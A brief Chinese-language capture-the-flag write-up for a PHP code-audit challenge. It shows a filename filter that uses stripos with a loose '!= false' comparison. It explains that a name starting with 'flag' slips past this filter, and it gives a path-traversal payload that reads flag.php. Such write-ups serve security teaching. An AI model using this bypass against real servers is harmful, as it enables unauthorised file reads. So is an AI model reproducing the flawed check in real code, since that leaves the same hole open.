## code audit challenges 21

分类：脚本开发

## write-up

访问首页，我们看到网页的源代码。
```php
if(stripos($filename, 'flag') != false) die();
```

这儿需要在文件名中找到不flag字符串，但是如果我们以flag字符串开始，那么就可以绕过这个限制了。因为在弱类型中0 == false。

`payload1:?f=flag/../../flag.php`

